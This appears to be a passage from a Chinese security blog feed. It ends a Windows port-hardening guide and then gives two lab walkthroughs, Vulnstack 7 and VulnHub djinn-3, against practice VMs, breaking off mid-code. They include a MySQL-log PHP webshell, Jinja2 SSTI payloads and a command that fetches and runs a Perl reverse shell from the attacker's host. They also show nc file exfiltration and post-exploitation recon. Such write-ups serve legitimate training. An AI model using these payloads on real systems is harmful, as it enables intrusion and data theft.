Service”提供的，主要用于提供Windows文件和打印机共享以及Unix中的Samba服务。在Windows中要在局域网中进行文件的共享，必须使用该端口。</p><p>端口漏洞：开启139端口虽然可以提供共享服务，但是常常被利用攻击，比如使用流光、superscan等端口扫描攻击，可以扫描到目标计算机的139端口，如果发现有漏洞，可以试图获取用户名和密码，这是非常危险的。</p></blockquote><h3 id="禁用NetBIOS操作步骤"><a href="#禁用NetBIOS操作步骤" class="headerlink" title="禁用NetBIOS操作步骤"></a>禁用NetBIOS操作步骤</h3><p>在【网络适配器】中的本地连接状态中进行操作（也就是主机改ip的位置）</p><p>选择【高级】</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422162000482.png" alt="image-20210422162000482"></p><p>选择【WINS】  勾选【禁用】</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422162116602.png" alt="image-20210422162116602" style="zoom:80%;" /><p>确定之后，重启即可关闭139端口。</p><h2 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h2><blockquote><p>局域网共享文件夹或打印机的端口，勒索病毒常利用的端口</p></blockquote><h3 id="注册表关闭方式"><a href="#注册表关闭方式" class="headerlink" title="注册表关闭方式"></a>注册表关闭方式</h3><p>win+R regedit</p><p>找到注册表项 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet\Services\NetBT\Parameters </p><p>在Parameters上右键选择【新建】 根据系统32位还是64位选择【DWORD(32位)】或【QWORD(64位)】</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422163214264.png" alt="image-20210422163214264"></p><p>新建名为 <code>SMBDeviceEnabled</code> 右键单击修改值为 <code>0</code> 即可</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422163647839.png" alt="image-20210422163647839"></p><p>注：win7系统关闭445 还要把操作系统的server服务关闭</p><p>win+R services.msc</p><p>找到server服务，单击，启动类型改为【禁用】，把服务状态改为【停止】，应用即可</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422164250378.png" alt="image-20210422164250378"></p><h2 id="关闭默认共享方法"><a href="#关闭默认共享方法" class="headerlink" title="关闭默认共享方法"></a>关闭默认共享方法</h2><p>使用 “NET SHARE 共享文件夹 /DELETE” 及禁用共享方法（无法禁用IPC$共享）关闭后，但重启后仍会重新共享，永久停用的方法如下：</p><p>1、禁用服务法</p><p>找到server服务，单击，启动类型改为【禁用】，把服务状态改为【停止】，应用即可</p><p>2、注册表改键值法</p><p>找到“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters”项，双击“AntoShareServer”项，将1改为0，如果没有就自己新建一个再改。 然后还在这里找到“AutoShareWks”项,把1改为0，关闭admin$共享。</p><p>再找到“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa”处找到“restrictanonymous”将值改为1，关闭IPC$共享。</p><p>重启后即可生效，一经改动就会永远停止共享。</p><p>3、不适用共享服务的话， 也可以在【本地连接】属性中取消对 【Microsoft网络客户端】和【Microsoft网络文件和打印架共享】的勾选，然后直接卸载掉！</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422170628980.png" alt="image-20210422170628980" style="zoom:50%;" /><h2 id="防火墙禁用指定端口"><a href="#防火墙禁用指定端口" class="headerlink" title="防火墙禁用指定端口"></a>防火墙禁用指定端口</h2><p>【控制面板】-【小图标】-【Windows防火墙】-【高级设置】-【入站规则】-【新建规则】-【端口】-【TCP】-【特点本地端口】-【阻止连接】-【选择作用范围】-【自己起个名】-【完成】</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422171758579.png" alt="image-20210422171758579"></p><blockquote><p>同理，可以禁用任何想禁用的端口，没人能访问的了。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.doczhi.com/p-889260.html">https://www.doczhi.com/p-889260.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack红队评估(七)</title>
      <link href="2023/11/28/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0(%E4%B8%83)/"/>
      <url>2023/11/28/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0(%E4%B8%83)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>靶机位置：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>虚拟机密码hongrisec@2019</p><p>环境共有三个主机：</p><p>VM1：win7提供外网</p><p>VM2：winserver 2003内网域成员</p><p>VM3：winserver 2008内网域控</p><p>拓扑如下：</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201094822719.png" alt="image-20210201094822719"></p><p>进入win7 启动phpstudy，设置网络模式为nat</p><p>将kali也设置成nat</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>win7主机ip：192.168.233.129</p><p>扫描端口发现80端口，打开是phpinfo，测试mysql数据库，root-root测试成功</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201095256095.png" alt="image-20210201095256095"></p><p>还发现了绝对路径 <code>C:/phpstudy/WWW</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201095434494.png" alt="image-20210201095434494"></p><h2 id="dirmap目录扫描"><a href="#dirmap目录扫描" class="headerlink" title="dirmap目录扫描"></a>dirmap目录扫描</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirmap.py -i <span class="number">192.168</span><span class="number">.233</span><span class="number">.129</span> -lcf</span><br></pre></td></tr></table></figure><p>发现一个备份文件rar： <code>beifen.rar</code></p><p>发现了根路径: <code>phpmyadmin</code></p><p>备份文件下载到本地后发现后台是yxcms</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201092333512.png" alt="image-20210201092333512"></p><p>并翻找里面的备份文件，发现了关键信息<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201092253748.png" alt="image-20210201092253748"></p><blockquote><p>后台地址：<code>yxcms/index.php?r=admin</code></p><p>默认的用户名和密码：<code>admin/123456</code></p></blockquote><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="一：phpmyadmin日志写入"><a href="#一：phpmyadmin日志写入" class="headerlink" title="一：phpmyadmin日志写入"></a>一：phpmyadmin日志写入</h3><p>先进入phpmyadmin，查询是否有写权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@secure_file_priv;   </span><br></pre></td></tr></table></figure><p>结果显示NULL，是非空，说明没有写权限</p><p>只能换日志getshell方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">&#x27;on&#x27;</span>;     <span class="comment"># 开启日志读写</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span>  general_log_file =<span class="string">&quot;C:/phpstudy/WWW/404.php&quot;</span>;    <span class="comment"># 指定日志文件</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;  <span class="comment"># 查看当前的日志记录</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201104259958.png" alt="image-20210201104259958"></p><p>已经更改日志文件，开始执行一次查询语句，默认会放进日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201104621026.png" alt="image-20210201104621026"></p><h3 id="二：yxcms管理页面"><a href="#二：yxcms管理页面" class="headerlink" title="二：yxcms管理页面"></a>二：yxcms管理页面</h3><p>通过获取的yxcms后台登录 <code>yxcms/index.php?r=admin</code></p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201104903031.png" alt="image-20210201104903031" style="zoom:80%;" /><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201105005468.png" alt="image-20210201105005468"></p><p>找到全局设置——前台模板——选择其中一个模板编辑，将一句话写进去</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201110509915.png" alt="image-20210201110509915"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201110047035.png" alt="image-20210201110047035"></p><p>这个模板是评论模板，所以我只要去评论区评论一下，就会执行木马了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201110202324.png" alt="image-20210201110202324"></p><p>用蚁剑连接 <a href="http://192.168.233.129/yxcms/index.php?r=default/news/content&amp;id=15">http://192.168.233.129/yxcms/index.php?r=default/news/content&amp;id=15</a></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201110431437.png" alt="image-20210201110431437"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>蚁剑中上传exe木马后cs进行连接</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201143554356.png" alt="image-20210201143554356"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201143609722.png" alt="image-20210201143609722"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201143825090.png" alt="image-20210201143825090"></p><p>进入beacon后，第一步降低心跳值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 5</span><br></pre></td></tr></table></figure><h3 id="查询信息"><a href="#查询信息" class="headerlink" title="查询信息"></a>查询信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell whoami</span><br><span class="line">shell hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>查看是什么操作系统 &amp; 系统版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">系统中文：systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br><span class="line">系统英文：systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure><p>查询系统体系架构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo % PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p>查询已安装的软件及版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>win10</code> 中，输入 <code>wmic /?</code> 会提示 <code>wmic</code> 已弃用，但在 <code>server2012R2</code>，<code>win7</code> 等版本中可以正常使用</p><p><code>powershell</code> 中可替代该命令的是 <code>Get-WmiObject</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure></blockquote><p>查询进程及服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist  # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 默认显示映像名称，PID，服务</span><br></pre></td></tr></table></figure><p>查看进程列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p>常见的杀软进程：</p><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360 杀毒</td></tr><tr><td>360tray.exe</td><td>360 实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360 主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee</td><td>McShield.exe</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><blockquote><p>域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 从 Windows Server 2003 开始 ， Active Directory 是负责维护该中央数据库的 Windows 组件。Windows 域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p></blockquote><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>先查看DNS服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all   </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201150025618.png" alt="image-20210201150025618"></p><p>查看域信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><p>查看主域信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure><p>查看时间服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1、<a href="https://v0w.top/2020/07/19/vulnstack1/">https://v0w.top/2020/07/19/vulnstack1/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub djinn-3 writeup</title>
      <link href="2023/11/28/vulnhub%20djinn3/"/>
      <url>2023/11/28/vulnhub%20djinn3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125102655281.png" alt="image-20210125102655281"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125102842905.png" alt="image-20210125102842905"></p><h3 id="5000端口-flask框架"><a href="#5000端口-flask框架" class="headerlink" title="5000端口(flask框架)"></a>5000端口(flask框架)</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125103444864.png" alt="image-20210125103444864"></p><p>发现5000服务是<code>Werkzeug</code> 网站是flask框架，想起了flask有一个SSTI(Server-Side Template Injection) 服务端模板注入漏洞</p><p>漏洞详细描述：<a href="https://www.cnblogs.com/Rasang/p/12181654.html">flask漏洞探究</a></p><p>利用原理：在Jinja2引擎中，<code>&#123;&#123;&#125;&#125;</code>不仅仅是变量标示符，也能执行一些简单的表达式</p><blockquote><p>Flask 依赖 <a href="https://www.palletsprojects.com/p/jinja/">Jinja</a> 模板引擎和 <a href="https://www.palletsprojects.com/p/werkzeug/">Werkzeug</a> WSGI 套件</p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125102929926.png" alt="image-20210125102929926"></p><p>链接可以点开查看</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125102957554.png" alt="image-20210125102957554"></p><h3 id="31337端口"><a href="#31337端口" class="headerlink" title="31337端口"></a>31337端口</h3><p>nc 连接，猜测用户名和密码，因为在5000端口看到一个用户名尝试一下进入</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125103209859.png" alt="image-20210125103209859"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125102819111.png" alt="image-20210125102819111"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>再回到5000端口页面下，可以看到出现了新的ID链接</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125104219521.png" alt="image-20210125104219521"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125104148349.png" alt="image-20210125104148349"></p><h2 id="利用SSTI注入漏洞反弹shell"><a href="#利用SSTI注入漏洞反弹shell" class="headerlink" title="利用SSTI注入漏洞反弹shell"></a>利用SSTI注入漏洞反弹shell</h2><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz">SSTI payload</a>中找一个payload反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>其中(‘<code>id</code>‘)换成执行语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;wget http:&#x2F;&#x2F;192.168.56.123:8000&#x2F;perl.pl;perl perl.pl&#39;)|attr(&#39;read&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>perl.pl是kali下自带的 /usr/share/webshells/perl/perl-reverse-shell.pl，改下IP和位置，python -m SimpleHTTPServer开启文件的传输条件</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125105816614.png" alt="image-20210125105816614"></p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125110747226.png" alt="image-20210125110747226"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125110908138.png" alt="image-20210125110908138"></p><p>默认监听端口为1234</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125111033777.png" alt="image-20210125111033777"></p><p>成功获取shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>kali</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>靶机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.56.123&#x2F;pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64</span><br></pre></td></tr></table></figure><blockquote><p>pspy是一个命令行工具，它可以在没有root权限的情况下监控linux进程，可以利用它查看其它用户的计划任务工作（crontab）</p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125162437452.png" alt="image-20210125162437452"></p><p>发现了saint用户的后台程序，还发现这两个文件三分钟执行一次，看来是个定时程序，后面一定会用的到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd | grep &#x2F;bin&#x2F;bash</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">saint:x:1000:1002:,,,:&#x2F;home&#x2F;saint:&#x2F;bin&#x2F;bash</span><br><span class="line">jack:x:1001:1003:,,,:&#x2F;home&#x2F;jack:&#x2F;bin&#x2F;bash</span><br><span class="line">mzfr:x:1002:1004:,,,:&#x2F;home&#x2F;mzfr:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>查找属于saint用户具有可读可写可执行的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user saint -perm -u&#x3D;wrx 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210125163632533.png" alt="image-20210125163632533"></p><p>两个隐藏文件，下载到本地进行反编译</p><h3 id="nc传输文件"><a href="#nc传输文件" class="headerlink" title="nc传输文件"></a>nc传输文件</h3><p>kali监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777 &gt; 1.pyc</span><br></pre></td></tr></table></figure><p>靶机传输</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.123 7777 &lt; .&#x2F;.configuration.cpython-38.pyc</span><br></pre></td></tr></table></figure><h3 id="uncompyle6反编译"><a href="#uncompyle6反编译" class="headerlink" title="uncompyle6反编译"></a>uncompyle6反编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 1.pyc &gt; 1.py</span><br><span class="line">cat 1.py </span><br></pre></td></tr></table></figure><p>1.py内容如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, json</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigReader</span>:</span></span><br><span class="line">    config = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span>(<span class="params">path</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reads the config file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        config_values = &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                config_values = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;Couldn&#x27;t properly parse the config file. Please use properl&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> config_values</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_config_path</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set the config path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        files = glob(<span class="string">&#x27;/home/saint/*.json&#x27;</span>)</span><br><span class="line">        other_files = glob(<span class="string">&#x27;/tmp/*.json&#x27;</span>)</span><br><span class="line">        files = files + other_files</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(files) &gt; <span class="number">2</span>:</span><br><span class="line">                files = files[:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1 = os.path.basename(files[<span class="number">0</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                file2 = os.path.basename(files[<span class="number">1</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> file1[(<span class="number">-2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> file2[(<span class="number">-2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                        a = dt.strptime(file1[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                        b = dt.strptime(file2[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> b &lt; a:</span><br><span class="line">                    filename = files[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    filename = files[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure><blockquote><p>该程序会列出saint家目录下和/tmp下所有的json文件，且是json文件是日期的形式</p></blockquote><p>同样的方法，获得.syncer.cpython-38.pyc反编译后的内容如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> configuration <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.ftpconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> 